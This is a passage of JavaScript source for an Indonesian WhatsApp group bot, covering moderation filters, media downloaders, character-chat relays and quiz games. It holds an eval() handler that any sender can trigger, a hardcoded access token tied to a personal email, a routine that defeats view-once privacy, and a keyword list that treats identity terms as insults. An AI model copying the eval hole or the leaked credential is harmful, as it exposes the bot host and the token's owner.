     text: db.data.chats[m.chat].notification.text_left ? db.data.chats[m.chat].notification.text_welcome : `✨ Welcome To ${metadata.subject} | @${sender.split("@")[0]}`, 
      contextInfo: {
         externalAdReply: {
         title: `${botname}`,
         body: `${ownername}`,
         thumbnailUrl: ppuser,
         sourceUrl: "https://ikankoi.my.id",
         mediaType: 1,
         renderLargerThumbnail: false
    }}})
                        await sleep(100)
                        qyuunee.sendMessage(anu.id, { audio: fs.readFileSync('./mp3/welcome.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
                     } else if (anu.action == 'remove') {
                        qyuunee.sendMessage(anu.id, {
     text: db.data.chats[m.chat].notification.text_left ? db.data.chats[m.chat].notification.text_left : `🕊️ Selamat Tinggal @${sender.split("@")[0]}`, 
      contextInfo: {
         externalAdReply: {
         title: `${botname}`,
         body: `${ownername}`,
         thumbnailUrl: ppuser,
         sourceUrl: "https://ikankoi.my.id",
         mediaType: 1,
         renderLargerThumbnail: false
    }}})
                        await sleep(100)
                        qyuunee.sendMessage(anu.id, { audio: fs.readFileSync('./mp3/sayonara.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
                     }
                  }
               } catch (err) {
                  console.log(err)
               }
            })
        }
*/

if (db.data.chats[m.chat].antitoxic) {
const isToxic = /(anjing|kontol|memek|bangsat|babi|goblok|goblog|kntl|pepek|ppk|ngentod|ngentd|ngntd|kentod|kntd|bgst|anjg|anj|fuck|hitam|ireng|jawir|gay|asw|asu|ktl|ngentot|ngewe|bokep|bkp)/i;
    if (!m.isGroup) return
    const isAntiToxic = isToxic.exec(m.text)
    if (isAntiToxic && !isCreator) {
    qyuunee.sendMessage(m.chat, { delete: m.key })
    await qyuunee.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/toxic.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: koi })
    }}

if (db.data.chats[m.chat].wdh) {
if (budy.match(`tobrut|bokep|ambat|jomok`)) {
await qyuunee.sendMessage(m.chat, { react: { text: "😡",key: m.key,}})
qyuunee.sendMessage(from, { text: `woi admin, ada yang jorok nih.\n\nmampus lu @${m.sender.split("@")[0]}, gabisa pake fitur gw lagi.`, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
orgnye = `${m.sender.split("@")[0]}@s.whatsapp.net`;
banned.push(orgnye)
}
}


// Auto Download
if (db.data.chats[m.chat].autodown) {
try {
if (budy.match(`instagram.com`)) {
await qyuunee.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/instagram?url=${budy}`)
qyuunee.sendMessage(m.chat, { video: { url: anu.result.media}, caption: `🕊️`}, {quoted: m})
await qyuunee.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`tiktok.com`)) {
await qyuunee.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/tiktok?url=${budy}`)
qyuunee.sendMessage(m.chat, { video: { url: anu.result.Medium.url}, caption: `🕊️`}, {quoted: m})
await qyuunee.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`facebook.com`)) {
await qyuunee.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/facebook?url=${budy}`)
qyuunee.sendMessage(m.chat, { video: { url: anu.result.video_sd}, caption: `🕊️`}, {quoted: m})
await qyuunee.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`youtube.com|youtu.be`)) {
await qyuunee.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/ytmp4?url=${budy}`)
qyuunee.sendMessage(m.chat, { video: { url: anu.result.result}, caption: ``}, {quoted: m})
await qyuunee.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} 
} catch (err) {
await qyuunee.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})
}
}

// Anti Link
if (db.data.chats[m.chat].antilink) {
            if (budy.match(`chat.whatsapp.com`)) {
                reply(`「 ANTI LINK WHATSAPP 」\n\nKamu Terdeteksi Mengirim Link Group, Maaf Kamu Akan Di Kick !`)
                if (!isBotAdmins) return reply(`Ehh Bot Gak Admin T_T`)
                let gclink = (`https://chat.whatsapp.com/` + await qyuunee.groupInviteCode(m.chat))
                let isLinkThisGc = new RegExp(gclink, 'i')
                let isgclink = isLinkThisGc.test(m.text)
                if (isgclink) return reply(`Ehh Maaf Gak Jadi, Link Group Ini Ternyata 😆`)
                if (isAdmins) return reply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return reply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                qyuunee.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
                qyuunee.sendMessage(m.chat, { delete: m.key })
            }
        }
        if (db.data.chats[m.chat].antilinkv2) {
            if (budy.match(`chat.whatsapp.com`)) {
                reply(`「 ANTI LINK WHATSAPP 」\n\n*JANGAN SHARE GC LAIN!!!*`)
                if (!isBotAdmins) return reply(`Ehh Bot Gak Admin T_T`)
                let gclink = (`https://chat.whatsapp.com/` + await qyuunee.groupInviteCode(m.chat))
                let isLinkThisGc = new RegExp(gclink, 'i')
                let isgclink = isLinkThisGc.test(m.text)
                if (isgclink) return reply(`Ehh Maaf Gak Jadi, Link Group Ini Ternyata 😆`)
                if (isAdmins) return reply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return reply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                qyuunee.sendMessage(m.chat, { delete: m.key })
            }
        }
        if (db.data.chats[m.chat].antichannel) {
            if (budy.match(`whatsapp.com/channel`)) {
                reply(`「 ANTI LINK CHANNEL 」\n\n*JANGAN SHARE SALURAN LAIN!!!*`)
                if (!isBotAdmins) return reply(`Ehh Bot Gak Admin T_T`)
                qyuunee.sendMessage(m.chat, { delete: m.key })
            }
        }
        //Anti Panel
        if (db.data.chats[m.chat].antipanel) {
            if (budy.match('panel')) {
            reply(`「 *ANTI PROMOSI PANEL* 」\n\nApa? Panel? Beli Di Admin Sini Aja, Yg Lain Jelek, Cepet Down, Lemot, Banyak Masalah!\n\nMau? Chat Ke:\nt.me/qyuunee`)
                if (!isBotAdmins) return reply(`Kan Aku Belum Jadi Admin 🥲`)
                if (isAdmins) return reply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return reply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                qyuunee.sendMessage(m.chat, { delete: m.key })}
            if (budy.match('Panel')) {
            reply(`「 *ANTI PROMOSI PANEL* 」\n\nApa? Panel? Beli Di Admin Sini Aja, Yg Lain Jelek, Cepet Down, Lemot, Banyak Masalah!\n\nMau? Chat Ke:\nt.me/qyuunee`)
                if (!isBotAdmins) return reply(`Kan Aku Belum Jadi Admin 🥲`)
                if (isAdmins) return reply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return reply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                qyuunee.sendMessage(m.chat, { delete: m.key })}
            if (budy.match('PANEL')) {
                reply(`「 *ANTI PROMOSI PANEL* 」\n\nApa? Panel? Beli Di Admin Sini Aja, Yg Lain Jelek, Cepet Down, Lemot, Banyak Masalah!\n\nMau? Chat Ke:\nt.me/qyuunee`)
                if (!isBotAdmins) return reply(`Kan Aku Belum Jadi Admin 🥲`)
                if (isAdmins) return reply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return reply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                qyuunee.sendMessage(m.chat, { delete: m.key })
            }
        }

/*
if (ChatBot) {
if (!m.isGroup) return onlygc()
if (m.message) {
if (!text) return
  let api = await fetchJson(`https://api.itsrose.life/cai/chat?message=${spychat}&character_id=RQrrOj-UNdEV2_PC5D03US-27MZ7EUtaRH_husjbRQA&apikey=Rk-Salsabila`)
  results = api.result.message
  m.reply(result)
  }
}*/
if (budy.startsWith('selfgc')) {
if (!m.isGroup) return
if (args[0] === "on") {
                    if (db.data.chats[m.chat].selfgc) return reply(`Sudah Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].selfgc = true
                    reply(`Mode self grup aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].selfgc) return reply(`Sudah Tidak Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].selfgc = false
                    reply(`Mode self grup nonaktif 🕊️`)
                } else {
                   reply(`Ketik selfgc on/off`)
                }
}

if ( db.data.chats[m.chat].antiviewonce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
        let val = { ...m }
        let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
        delete msg[Object.keys(msg)[0]].viewOnce
        val.message = msg
        await qyuunee.sendMessage(m.chat, { forward: val }, { quoted: m })
    }

if (db.data.chats[m.chat].antibot) {
    if (m.isBaileys && m.fromMe == false){
        if (isAdmins || !isBotAdmins){  
        } else {
		qyuunee.sendMessage(m.chat, { text: `*• ANTI BOT •*\n👋🏻 Selamat Tinggal @${m.sender.split("@")[0]}`, mentions: m.sender })
    return await qyuunee.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }

if (db.data.chats[m.chat].antispam) {
if (m.isGroup && m.message && koi_antispam.isFiltered(from)) {
console.log(`[SPAM]`, color(moment(m.messageTimestamp * 100).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
return await qyuunee.sendMessage(from, { text: 'woi admin, ada yang spam nih.', contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
}

  
if (db.data.chats[m.chat].cai) {
if (!m.isGroup) return
const C = require('node-fetch')
const x = require('fs')
if (x.existsSync("./datakoi/cai_id.json")) {
  try {
    const fileData = x.readFileSync("./datakoi/cai_id.json", 'utf-8');
    nicknameCharIdDict = JSON.parse(fileData);
  } catch (q) {
    console.error("Error loading JSON file:", q);
  }
}
if (budy.startsWith('cai')) {
  if (args[0] === 'search') {
    const Q = "https://cih-cai-jir.koi.pics/search?q=" + encodeURIComponent(`${args[1]}`);
    try {
      const d = await C(Q);
      const u = await d.json();
      const V = u.characters.slice(0x0, 0x5);
      const L = V.map(U => ({
        'external_id': U.external_id,
        'participant_name': U.participant__name,
        'title': U.title
      }));
      reply(JSON.stringify(L, null, 0x2));
      /*qyuunee.sendMessage(m.chat, {text: `*${u.characters[0x0, 0x5].participant__name}*\n> Title: ${u.characters[0x0, 0x5].title}\n> Code: ${u.characters[0x0, 0x5].external_id}`}, {quoted:m})*/
    } catch (U) {
      console.error("Error:", U);
      reply("Error fetching data from the API.")
    }
    } else if (args[0] === 'new') {
      const v = nicknameCharIdDict[`${args[1]}`];
      if (v) {
        const g = "https://cih-cai-jir.koi.pics/newchat?id=" + v;
        try {
          let y = await fetchJson(g);
          reply("Done...");
          qyuunee.sendMessage(m.chat, {text: y.status}, {quoted:m})
        } catch (j) {
          console.error('Error:', j);
          reply("Error fetching data from the API.")
        }
      } else {
        reply("No character found with the nickname \"" + `${args[1]}` + "\"");
      }
    } else if (args[0] === 'add') {
    if (!isAdmins && !isCreator) return reply('Access Denied!')
        const q = `${args[1]}`
        const [e, N] = q.split(':');
        nicknameCharIdDict[e] = N;
        fs.writeFileSync("./datakoi/cai_id.json", JSON.stringify(nicknameCharIdDict, null, 0x2));
        reply("Added nickname \"" + e + "\" for charid \"" + N + "\"");
      } else if (args[0] === 'trending') {
          try {
            const E = await C("https://cih-cai-jir.koi.pics/trending");
            const c = await E.json();
            const o = c.trending_characters.slice(0x0, 0x5);
            const z = o.map(m => ({
              'external_id': m.external_id,
              'participant_name': m.participant__name,
              'title': m.title
            }));
            reply(JSON.stringify(z, null, 0x2));
          } catch (m) {
            console.error("Error:", m);
            reply("Error fetching trending data from the API.")
          }
        } else if (args[0] === 'del') {
        if (!isCreator) return reply('Access Denied!')
      const charNicknameToDelete = `${args[1]}`
      if (nicknameCharIdDict[charNicknameToDelete]) {
        delete nicknameCharIdDict[charNicknameToDelete];
        fs.writeFileSync("./datakoi/cai_id.json", JSON.stringify(nicknameCharIdDict, null, 0x2));
        reply(`Deleted nickname "${charNicknameToDelete}"`);
      } else {
        reply(`No character found with the nickname "${charNicknameToDelete}"`);
      }
        } else if (args[0] === 'char') {
            const S = Object.keys(nicknameCharIdDict);
            if (S.length === 0x0) {
              reply("No character nicknames are available.");
            } else {
              reply("Characters Available:\n```➤ " + S.join("```\n➤  ```") + '```');
            }
          } else {
            reply("Invalid 'cai' command.\n*Usage*:\ncai char,\ncai search ```<query>```,\ncai new ```<charnickname>```,\ncai trending,\ncai add ```<nickname>:<charid>```.");
          }
        }

const nicknames = Object.keys(nicknameCharIdDict);
if (budy.startsWith('')) {
    const M = budy.split(" ");
    const Q = M[0x0];
    if (nicknames.includes(Q)) {
      qyuunee.sendPresenceUpdate("composing");
      const d = nicknameCharIdDict[Q];
      const u = M.slice(0x1).join(" ");
      try {
        const V = await C("https://cih-cai-jir.koi.pics/cai?char=" + d + "&message=" + encodeURIComponent(u));
        const L = await V.json();
        const U = L.reply;
        qyuunee.sendMessage(m.chat, {text: `*${L.name}*\n> ${U}`}, {quoted:m})
      } catch (H) {
        console.error("Error sending request:", H);
      }
    }
}
}

if(m.mtype === "interactiveResponseMessage"){
            let msg = m.message[m.mtype]  || m.msg
            if(msg.nativeFlowResponseMessage  && !m.isBot  ){ 
                let { id } = JSON.parse(msg.nativeFlowResponseMessage.paramsJson) || {}  
                if(id){
                    let emit_msg = { 
                        key : { ...m.key } , // SET RANDOME MESSAGE ID  
                        message:{ extendedTextMessage : { text : id } } ,
                        pushName : m.pushName,
                        messageTimestamp  : m.messageTimestamp || 754785898978
                    }
                    return qyuunee.ev.emit("messages.upsert" , { messages : [ emit_msg ] ,  type : "notify"})
                }
            }
        }
        
/*
if (budy.startsWith('.')) {
    const Q = m.quoted.text
    if (nicknames.includes(Q)) {
qyuunee.sendPresenceUpdate("composing");
      const d = nicknameCharIdDict[Q];
      try {
        const V = await C('https://cih-cai-jir.koi.pics/cai?char=' + d + "&message=" + encodeURIComponent(spychat));
        const L = await V.json();
        const U = L.reply;
        qyuunee.sendMessage(m.chat, {text: `${nicknames}: ${U}`}, {quoted:m})
} catch (H) {
    console.error("Error sending request:", H);
  }
  }
}*/

let list = []
for (let i of owner) {
list.push({
displayName: await qyuunee.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await qyuunee.getName(i + '@s.whatsapp.net')}\n
FN:${await qyuunee.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:palsu8877@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://ikankoi.my.id\n
item3.X-ABLabel:Grup WangSaff\n
item4.ADR:;;Japan;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: qyuunee.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, qyuunee.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
qyuunee.ev.emit('messages.upsert', msg)
}

if (budy.startsWith('©️')) {
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}

async function sendGeekzMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await qyuunee.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Lumine-MD`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

async function aigpt(prompt) {
  try {
   const response = await axios.get("https://tools.revesery.com/ai/ai.php?query=" + prompt, {
     headers: {
      'Accept': '*/*',
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.999 Safari/537.36'
      }
    });
    const res = response.data
    const evaled = res.result
    /*
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
reply(evaled)
*/
  } catch (error) {
  console.error(error)
  }
}

/*async function nobg(url) {
try {
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');

const formData = new FormData();

formData.append('size', 'auto');
formData.append('image_url', url);

axios({
  method: 'post',
  url: 'https://api.remove.bg/v1.0/removebg',
  data: formData,
  responseType: 'arraybuffer',
  headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
  encoding: null
})
.then((response) => {
  if(response.status != 200) return console.error('Error:', response.status, response.statusText);
  fs.writeFileSync("no-bg.png", response.data);
})
  } catch (error) {
  console.error(error)
  }
}*/

async function ttslide(text) {
    let response = await axios.get(`https://dlpanda.com/id?url=${text}&token=G7eRpMaa`)
    const html = response.data
    const $ = cheerio.load(html)
    let asd = []
    let imgSrc = []
    let creator = 'Jikarinka'
    $('div.col-md-12 > img').each((index,
        element) => {
        imgSrc.push($(element).attr('src'))
    })
    asd.push({
        creator,
        imgSrc
    })
    let fix = imgSrc.map((e,
        i) => {
        return {
            img: e,
            creator: creator[i]
        }
    })
    for (let i of asd) {
        return i
    }
}

async function cai(query) {
        let token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IkVqYmxXUlVCWERJX0dDOTJCa2N1YyJ9.eyJnaXZlbl9uYW1lIjoiUkNTIiwiZmFtaWx5X25hbWUiOiJYWiIsIm5pY2tuYW1lIjoicmNzeHo2NDkiLCJuYW1lIjoiUkNTIFhaIiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0lYbGpRdW11SWlQTjdwLUoxUk1HNjZ0ODZzTzJhMG9DcW93RTlZVDFzaj1zOTYtYyIsImxvY2FsZSI6ImlkIiwidXBkYXRlZF9hdCI6IjIwMjMtMTEtMDVUMTQ6NTM6NDkuNjM0WiIsImVtYWlsIjoicmNzeHo2NDlAZ21haWwuY29tIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsImlzcyI6Imh0dHBzOi8vY2hhcmFjdGVyLWFpLnVzLmF1dGgwLmNvbS8iLCJhdWQiOiJkeUQzZ0UyODFNcWdJU0c3RnVJWFloTDJXRWtucVp6diIsImlhdCI6MTY5OTE5NjAzNCwiZXhwIjoxNzAyNzk2MDM0LCJzdWIiOiJnb29nbGUtb2F1dGgyfDExMDY5MjA2MTkzMTI0MTU4NTgwNSIsInNpZCI6IjVhaklfSlRJeFBZWGpzU0piWmdzRnQ4MXhaTHRhRERyIiwibm9uY2UiOiJUQzE0V2xvMVNGSmlkVU5FWVVSbFJXb3dTV3RJU25acVRtVTRVR3hoUldReU0xQm5Rbk0yYjAwNWJ3PT0ifQ.jduu283Aycw7GwUL270EkwoF71bINRrLnFzVJGpoG9uOO4A-jxtZ07XRZIr_t4lT_gt2N19BWXg7SGxRR_coFbCJLfyUHLzxx6ZaDGMqUnCPhJ6WXBHABsTsqnlQIJs1sQPJyLKw01-FU5FoB8atW3OIyjt0nJayJtMSm4NzKkGR2gBWZSNR3FIqX7r4NY_wUSc-1Za50FaMiLg3XdGkfE59wxs_NdlxxdPVVG4G4uKBWQCIy6ofRDnnb22Wfw1knt8yXMjGfq8RtSsAkGMmjp_KVICSRDCqy0cCOtUdmih5LCRyEQagIRBl90SP753C7ehiue_ucidCYh9XrxP7HQ";
    return new Promise(async (resolve, reject) => {
    try {
        const request = await axios({
            method: "POST",
            url: "https://beta.character.ai/chat/streaming/",
            body: JSON.stringify(query),
            headers: {
            "authorization": "Token " + token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            client: "Token " + token
            }
            })

        if (request.status() === 200) {
            const response = await JSON.parse(request);
            const replies = response.replies;

            const messages = []

            for (let i = 0; i < replies.length; i++) {
                qyuunee.sendMessage(i, {text: `${text}`}, {quoted:m})
            }
            resolve(i);
            }
        } catch (error) {
      reject(error);
    }
})
}

async function tiktoks(query) {
  return new Promise(async (resolve, reject) => {
    try {
      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/feed/search',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: {
          keywords: query,
          count: 20,
          cursor: 0,
          HD: 1
        }
      });
      const videos = response.data.data.videos;
      if (videos.length === 0) {
        reject("Tidak ada video ditemukan.");
      } else {
        const gywee = Math.floor(Math.random() * videos.length);
        const videorndm = videos[gywee]; 

        const result = {
          title: videorndm.title,
          cover: videorndm.cover,
          origin_cover: videorndm.origin_cover,
          no_watermark: videorndm.play,
          watermark: videorndm.wmplay,
          music: videorndm.music
        };
        resolve(result);
      }
    } catch (error) {
      reject(error);
    }
  });
}

async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}

const clean = (data) => {
  let regex = /(<([^>]+)>)/gi;
  data = data.replace(/(<br?\s?\/>)/gi, " \n");
  return data.replace(regex, "");
};

async function shortener(url) {
  return url;
}

async function tiktok(query) {
  let response = await axios("https://lovetik.com/api/ajax/search", {
    method: "POST",
    data: new URLSearchParams(Object.entries({ query })),
  });

  result = {};

  result.creator = "YNTKTS";
  result.title = clean(response.data.desc);
  result.author = clean(response.data.author);
  result.nowm = await shortener(
    (response.data.links[0].a || "").replace("https", "http")
  );
  result.watermark = await shortener(
    (response.data.links[1].a || "").replace("https", "http")
  );
  result.audio = await shortener(
    (response.data.links[2].a || "").replace("https", "http")
  );
  result.thumbnail = await shortener(response.data.cover);
  return result;
}

async function filterValidImages(images, limit) {
  const validImages = [];
  for (const image of images) {
    if (await isImageURL(image)) {
      validImages.push(image);
      if (validImages.length >= limit) {
        break; // Hentikan jika sudah mencapai jumlah gambar yang diminta
      }
    }
  }
  return validImages;
}

async function isImageURL(url) {
  try {
    const res = await fetch(url, { method: 'HEAD' });
    const contentType = res.headers.get('content-type');
    return contentType && contentType.startsWith('image'); // Memeriksa apakah tipe file adalah gambar
  } catch (error) {
    return false; // Jika terjadi kesalahan dalam memeriksa URL, mengembalikan false
  }
}

const sendapk = (teks) => {
qyuunee.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
reply('*Rusak Bodoh !! Yang Bener Contoh : Yoapk Koi*')
}
for (let ikalii of apknye) {
if (budy === ikalii) {
let buffer = fs.readFileSync(`./database/apk/${ikalii}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
qyuunee.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
reply('*Rusak Bodoh !! Yang Bener Contoh : Yozip Koi*')
}
for (let ikali of zipnye) {
if (budy === ikali) {
let buffer = fs.readFileSync(`./database/zip/${ikali}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
qyuunee.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
reply('*Rusak Bodoh !! Yang Bener Contoh : Yopdf Koi*')
}
for (let ikal of docunye) {
if (budy === ikal) {
let buffer = fs.readFileSync(`./database/Docu/${ikal}.pdf`)
senddocu(buffer)
}
}
const sendvn = (teks) => {
qyuunee.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, {quoted:m})
}

for (let anju of vnnye) {
if (budy.match(anju)) {
let buffer = fs.readFileSync(`./database/Audio/${anju}.mp3`)
sendvn(buffer)
}
}

const getCase = (cases) => {
            return "case  "+`'${cases}'`+fs.readFileSync("./qyuunee.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
        }
        
const totalFitur = () =>{
            var mytext = fs.readFileSync("./qyuunee.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
        
const sendStickerso = Math.random() < 0.4;  // 42%

/*const sendlist = (teks) => {
qyuunee.sendMessage(mem, { text: teks.response })
}

for (let uhuy of db_respon_list) {
if (budy.match(uhuy)) {
let buffer = fs.readFileSync("./database/list.json", JSON.stringify(uhuy[0].key));
sendlist(buffer)
}
}*/

var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
ppuser = await qyuunee.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

if (('family100'+from in _family100) && isCmd) {
kuis = true
let room = _family100['family100'+from]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
 let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
 if (room.terjawab[index]) return !0
 room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : `Perfect Player`}`.trim()
qyuunee.sendText(from, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+from].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+from]
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   qyuunee.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 await reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
 delete kuismath[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 qyuunee.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Gambar`}, {quoted:m})
 delete tebakgambar[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 qyuunee.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kata`}, {quoted:m})  
 delete tebakkata[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

